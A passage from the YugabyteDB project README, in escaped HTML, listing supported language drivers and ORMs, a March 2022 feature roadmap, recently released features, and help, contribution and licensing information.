using a PostgreSQL-compatible driver or ORM.&lt;/li&gt; &#xA; &lt;li&gt;Try running a real-world demo application: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/yugabyte/yugastore-java&#34;&gt;Microservices-oriented e-commerce app&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/develop/realworld-apps/iot-spark-kafka-ksql/&#34;&gt;Streaming IoT app with Kafka and Spark Streaming&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Cannot find what you are looking for? Have a question? Please post your questions or comments on our Community &lt;a href=&#34;https://communityinviter.com/apps/yugabyte-db/register&#34;&gt;Slack&lt;/a&gt; or &lt;a href=&#34;https://forum.yugabyte.com&#34;&gt;Forum&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Build Apps&lt;/h1&gt; &#xA;&lt;p&gt;YugabyteDB supports several languages and client drivers. Below is a brief list.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Language&lt;/th&gt; &#xA;   &lt;th&gt;ORM&lt;/th&gt; &#xA;   &lt;th&gt;YSQL Drivers&lt;/th&gt; &#xA;   &lt;th&gt;YCQL Drivers&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Java&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/java/ysql-spring-data/&#34;&gt;Spring/Hibernate&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/java/ysql-jdbc/&#34;&gt;PostgreSQL JDBC&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/java/ycql/&#34;&gt;cassandra-driver-core-yb&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Go&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/orm-examples&#34;&gt;Gorm&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/go/#ysql&#34;&gt;pq&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/go/#ycql&#34;&gt;gocql&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;NodeJS&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/orm-examples&#34;&gt;Sequelize&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/nodejs/#ysql&#34;&gt;pg&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/nodejs/#ycql&#34;&gt;cassandra-driver&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/orm-examples&#34;&gt;SQLAlchemy&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/python/#ysql&#34;&gt;psycopg2&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/python/#ycql&#34;&gt;yb-cassandra-driver&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Ruby&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/orm-examples&#34;&gt;ActiveRecord&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/ruby/#ysql&#34;&gt;pg&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/ruby/#ycql&#34;&gt;yugabyte-ycql-driver&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;C#&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/orm-examples&#34;&gt;EntityFramework&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.npgsql.org/&#34;&gt;npgsql&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/csharp/#ycql&#34;&gt;CassandraCSharpDriver&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;C++&lt;/td&gt; &#xA;   &lt;td&gt;Not tested&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/cpp/#ysql&#34;&gt;libpqxx&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/cpp/#ycql&#34;&gt;cassandra-cpp-driver&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;C&lt;/td&gt; &#xA;   &lt;td&gt;Not tested&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/c/#ysql&#34;&gt;libpq&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Not tested&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h1&gt;What&#39;s being worked on?&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;This section was last updated in &lt;strong&gt;March, 2022&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Current roadmap&lt;/h2&gt; &#xA;&lt;p&gt;Here is a list of some of the key features being worked on for the upcoming releases (the YugabyteDB &lt;a href=&#34;https://docs.yugabyte.com/latest/releases/release-notes/v2.13/&#34;&gt;&lt;strong&gt;v2.13 latest release&lt;/strong&gt;&lt;/a&gt; has been released in &lt;strong&gt;March, 2022&lt;/strong&gt;, and the &lt;a href=&#34;https://blog.yugabyte.com/announcing-yugabytedb-2-12/&#34;&gt;&lt;strong&gt;v2.12 stable release&lt;/strong&gt;&lt;/a&gt; was released in &lt;strong&gt;Feb 2022&lt;/strong&gt;).&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Feature&lt;/th&gt; &#xA;   &lt;th&gt;Status&lt;/th&gt; &#xA;   &lt;th&gt;Release Target&lt;/th&gt; &#xA;   &lt;th&gt;Progress&lt;/th&gt; &#xA;   &lt;th&gt;Comments&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/11765&#34;&gt;Faster Bulk-Data Loading in YugabyteDB&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PROGRESS&lt;/td&gt; &#xA;   &lt;td&gt;v2.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/11765&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Master issue to track improvements to make it easier and faster to get large amounts of data into YugabyteDB.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/11665&#34;&gt;Database-level multi-tenancy with tablegroups&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PROGRESS&lt;/td&gt; &#xA;   &lt;td&gt;v2.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/11665&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Master issue to track Database-level multi-tenancy using tablegroups.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/9797&#34;&gt;Upgrade to PostgreSQL v13&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PROGRESS&lt;/td&gt; &#xA;   &lt;td&gt;v2.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/9797&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;For latest features, new PostgreSQL extensions, performance, and community fixes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Support for &lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/7120&#34;&gt;in-cluster PITR&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PROGRESS&lt;/td&gt; &#xA;   &lt;td&gt;v2.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/7120&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Point in time recovery of YSQL databases, to a fixed point in time, across DDL and DML changes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/docdb-automatic-tablet-splitting.md&#34;&gt;Automatic tablet splitting enabled by default&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PROGRESS&lt;/td&gt; &#xA;   &lt;td&gt;v2.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/1004&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Enables changing the number of tablets (which are splits of data) at runtime.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;YSQL-table statistics and cost based optimizer(CBO)&lt;/td&gt; &#xA;   &lt;td&gt;PROGRESS&lt;/td&gt; &#xA;   &lt;td&gt;v2.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/5242&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Improve YSQL query performance&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/1124&#34;&gt;YSQL-Feature support - ALTER TABLE&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PROGRESS&lt;/td&gt; &#xA;   &lt;td&gt;v2.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/1124&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Support for various &lt;code&gt;ALTER TABLE&lt;/code&gt; variants&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/online-schema-migrations.md&#34;&gt;YSQL-Online schema migration&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PROGRESS&lt;/td&gt; &#xA;   &lt;td&gt;v2.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/4192&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Schema migrations(includes DDL operations) to be safely run concurrently with foreground operations&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Pessimistic locking Design&lt;/td&gt; &#xA;   &lt;td&gt;PROGRESS&lt;/td&gt; &#xA;   &lt;td&gt;v2.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/5680&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Make &lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/ysql-colocated-tables.md&#34;&gt;&lt;code&gt;COLOCATED&lt;/code&gt; tables&lt;/a&gt; default for YSQL&lt;/td&gt; &#xA;   &lt;td&gt;PLANNING&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/5239&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Support for transactions in async &lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/multi-region-xcluster-async-replication.md&#34;&gt;xCluster replication&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PLANNING&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/1808&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Apply transactions atomically on consumer cluster.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Support for GiST indexes&lt;/td&gt; &#xA;   &lt;td&gt;PLANNING&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/1337&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Suppor for GiST (Generalized Search Tree) based index&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Recently released features&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Feature&lt;/th&gt; &#xA;   &lt;th&gt;Status&lt;/th&gt; &#xA;   &lt;th&gt;Release Target&lt;/th&gt; &#xA;   &lt;th&gt;Docs / Enhancements&lt;/th&gt; &#xA;   &lt;th&gt;Comments&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/9019&#34;&gt;Change Data Capture&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.13&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Change data capture (CDC) allows multiple downstream apps and services to consume the continuous and never-ending stream(s) of changes to Yugabyte databases&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/10102&#34;&gt;Support for materalized views&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.13&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/explore/ysql-language-features/advanced-features/views/#materialized-views&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;A materialized view is a pre-computed data set derived from a query specification and stored for later use&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/9980&#34;&gt;Geo-partitioning support&lt;/a&gt; for the transaction status table&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.13&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/explore/multi-region-deployments/row-level-geo-partitioning/&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Instead of central remote transaction execution metatda, it is now optimized for access from different regions. Since the transaction metadata is also geo partitioned, it eliminates the need for round-trip to remote regions to update transaction statuses.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Transparently restart transactions&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.13&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Decrease the incidence of transaction restart errors seen in various scenarios&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/ysql-row-level-partitioning.md&#34;&gt;Row-level geo-partitioning&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.13&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/explore/multi-region-deployments/row-level-geo-partitioning/&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Row-level geo-partitioning allows fine-grained control over pinning data in a user table (at a per-row level) to geographic locations, thereby allowing the data residency to be managed at the table-row level.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/ysql-gin-indexes.md&#34;&gt;YSQL-Support &lt;code&gt;GIN&lt;/code&gt; indexes&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.11&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/explore/ysql-language-features/gin/&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Support for generalized inverted indexes for container data types like jsonb, tsvector, and array&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/ysql-collation-support.md&#34;&gt;YSQL-Collation Support&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.11&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/explore/ysql-language-features/collations/&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Allows specifying the sort order and character classification behavior of data per-column, or even per-operation according to language and country-specific rules&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/savepoints.md&#34;&gt;YSQL-Savepoint Support&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.11&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/explore/ysql-language-features/savepoints/&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Useful for implementing complex error recovery in multi-statement transaction&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/platform-xcluster-replication-management.md&#34;&gt;xCluster replication management through Platform&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.11&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/yugabyte-platform/create-deployments/async-replication-platform/&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/architecture/design/spring-data-yugabytedb.md&#34;&gt;Spring Data YugabyteDB module&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.9&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/7956&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Bridges the gap for learning the distributed SQL concepts with familiarity and ease of Spring Data APIs&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Support Liquibase, Flyway, ORM schema migrations&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.9&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://blog.yugabyte.com/schema-versioning-in-yugabytedb-using-flyway/&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/1124&#34;&gt;Support &lt;code&gt;ALTER TABLE&lt;/code&gt; add primary key&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.9&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/1124&#34;&gt;Track&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues/4421&#34;&gt;YCQL-LDAP Support&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.8&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/secure/authentication/ldap-authentication-ycql/#root&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;support LDAP authentication in YCQL API&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://blog.yugabyte.com/yugabytedb-2-8-alerts-and-notifications/&#34;&gt;Platform Alerting and Notification&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.8&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/yugabyte-platform/alerts-monitoring/alert/&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;To get notified in real time about database alerts, user defined alert policies notify you when a performance metric rises above or falls below a threshold you set.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://blog.yugabyte.com/yugabytedb-2-8-api-automated-operations/&#34;&gt;Platform API&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;✅ &lt;em&gt;DONE&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;v2.8&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://api-docs.yugabyte.com/docs/yugabyte-platform/ZG9jOjIwMDY0MTA4-platform-api-overview&#34;&gt;Docs&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Securely Deploy YugabyteDB Clusters Using Infrastructure-as-Code&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h1&gt;Architecture&lt;/h1&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/architecture/images/yb-architecture.jpg&#34; align=&#34;center&#34; alt=&#34;YugabyteDB Architecture&#34;&gt; &#xA;&lt;p&gt;Review detailed architecture in our &lt;a href=&#34;https://docs.yugabyte.com/latest/architecture/&#34;&gt;Docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Need Help?&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;You can ask questions, find answers, and help others on our Community &lt;a href=&#34;https://communityinviter.com/apps/yugabyte-db/register&#34;&gt;Slack&lt;/a&gt;, &lt;a href=&#34;https://forum.yugabyte.com&#34;&gt;Forum&lt;/a&gt;, &lt;a href=&#34;https://stackoverflow.com/questions/tagged/yugabyte-db&#34;&gt;Stack Overflow&lt;/a&gt;, as well as Twitter &lt;a href=&#34;https://twitter.com/yugabyte&#34;&gt;@Yugabyte&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Please use &lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/issues&#34;&gt;GitHub issues&lt;/a&gt; to report issues or request new features.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To Troubleshoot YugabyteDB, cluser/node level isssues, Please refer to &lt;a href=&#34;https://docs.yugabyte.com/latest/troubleshoot/&#34;&gt;Troubleshooting documentation&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Contribute&lt;/h1&gt; &#xA;&lt;p&gt;As an an open-source project with a strong focus on the user community, we welcome contributions as GitHub pull requests. See our &lt;a href=&#34;https://docs.yugabyte.com/latest/contribute/&#34;&gt;Contributor Guides&lt;/a&gt; to get going. Discussions and RFCs for features happen on the design discussions section of &lt;a href=&#34;https://forum.yugabyte.com&#34;&gt;our Forum&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;License&lt;/h1&gt; &#xA;&lt;p&gt;Source code in this repository is variously licensed under the Apache License 2.0 and the Polyform Free Trial License 1.0.0. A copy of each license can be found in the &lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/licenses&#34;&gt;licenses&lt;/a&gt; directory.&lt;/p&gt; &#xA;&lt;p&gt;The build produces two sets of binaries:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The entire database with all its features (including the enterprise ones) are licensed under the Apache License 2.0&lt;/li&gt; &#xA; &lt;li&gt;The binaries that contain &lt;code&gt;-managed&lt;/code&gt; in the artifact and help run a managed service are licensed under the Polyform Free Trial License 1.0.0.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;By default, the build options generate only the Apache License 2.0 binaries.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;Read More&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To see our updates, go to &lt;a href=&#34;https://blog.yugabyte.com/&#34;&gt;The Distributed SQL Blog&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;For an in-depth design and the YugabyteDB architecture, see our &lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/tree/master/architecture/design&#34;&gt;design specs&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Tech Talks and &lt;a href=&#34;https://www.youtube.com/c/YugaByte&#34;&gt;Videos&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;See how YugabyteDB &lt;a href=&#34;https://docs.yugabyte.com/latest/comparisons/&#34;&gt;compares 